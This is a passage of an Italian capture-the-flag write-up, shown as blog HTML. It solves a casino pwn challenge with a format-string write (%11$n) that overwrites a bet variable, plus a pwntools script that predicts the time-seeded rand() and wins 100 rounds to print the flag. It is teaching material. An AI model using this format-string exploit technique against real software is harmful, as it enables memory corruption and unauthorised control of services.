+<p>Si noti che <em>%11$n</em> significa &ldquo;Scrivi nell&rsquo;undicesimo parametro&rdquo;, è un modo per evitare di dover scriver undici volte lo stesso carattere (che comunque non ci starebbe nel nome).</p>
+
+<p>Quindi la stringa stampa 3 volte A e poi scrive all&rsquo;undicesimo parametro i caratteri scritti fino ad ora (3), l&rsquo;undicesimo parametro è sullo stack, ed è l&rsquo;indirizzo di <em>obj.bet</em> (0x602020).</p>
+
+<p>Il codice per sfruttare questa vulnerabilità è:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">betAddr</span> <span class="o">=</span> <span class="mh">0x602020</span>
+<span class="n">bet</span> <span class="o">=</span> <span class="mi">3</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="n">bet</span><span class="o">+</span><span class="s2">&#34;%11$n&#34;</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">betAddr</span><span class="p">))</span></code></pre></div>
+<p>Il codice completo per la risoluzione della CTF è il seguente:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="n">CDLL</span>
+<span class="kn">from</span> <span class="nn">math</span> <span class="kn">import</span> <span class="n">floor</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">libc</span> <span class="o">=</span> <span class="n">CDLL</span><span class="p">(</span><span class="s1">&#39;libc-2.28.so&#39;</span><span class="p">)</span>
+
+<span class="n">betAddr</span> <span class="o">=</span> <span class="mh">0x602020</span>
+<span class="n">bet</span> <span class="o">=</span> <span class="mi">3</span>
+
+<span class="n">toWin</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;challs.fireshellsecurity.team&#39;</span><span class="p">,</span><span class="mi">31006</span><span class="p">)</span>
+
+<span class="c1">#Generate the seed</span>
+<span class="n">seed</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">floor</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()))</span>
+<span class="n">seed</span> <span class="o">=</span> <span class="n">seed</span> <span class="o">*</span> <span class="mh">0xcccccccd</span>
+<span class="n">seed</span> <span class="o">=</span> <span class="n">seed</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span> <span class="c1">#Take the high part EDX</span>
+<span class="n">seed</span> <span class="o">=</span> <span class="n">seed</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span>
+<span class="n">seed</span> <span class="o">+=</span> <span class="n">bet</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s2">&#34;[Seed]: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">format</span><span class="p">(</span><span class="n">seed</span><span class="p">,</span> <span class="s1">&#39;#04x&#39;</span><span class="p">))</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">())</span> <span class="c1">#Name</span>
+<span class="k">print</span><span class="p">(</span><span class="s2">&#34;[*] Injecting the name&#34;</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s2">&#34;[*] bet = </span><span class="si">%d</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">bet</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="n">bet</span><span class="o">+</span><span class="s2">&#34;%11$n&#34;</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">betAddr</span><span class="p">))</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1">#Welcome: &lt;name&gt;</span>
+
+<span class="n">libc</span><span class="o">.</span><span class="n">srand</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span>
+
+<span class="k">while</span> <span class="n">toWin</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">:</span>
+    <span class="n">num</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">rand</span><span class="p">()</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;[Num]: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">format</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="s1">&#39;#04x&#39;</span><span class="p">))</span>
+
+    <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
+
+    <span class="n">toWin</span> <span class="o">+=</span> <span class="mi">1</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">())</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>
+<p>Si noti l&rsquo;istruzione <em>seed += bet</em>, per semplificare la spiegazione ho omesso di dire che anche <em>obj.bet</em> è parte (come semplice somma) del seed, poco male, basta tenerne conto.</p>
+
+<p>Eseguendo il programma si ottiene la flag:</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">F#{buggy_c4s1n0_1s_n0t_f41r!}</code></pre></div>
+  </section>
+</article>
+
+</main>
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2019 R13 - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
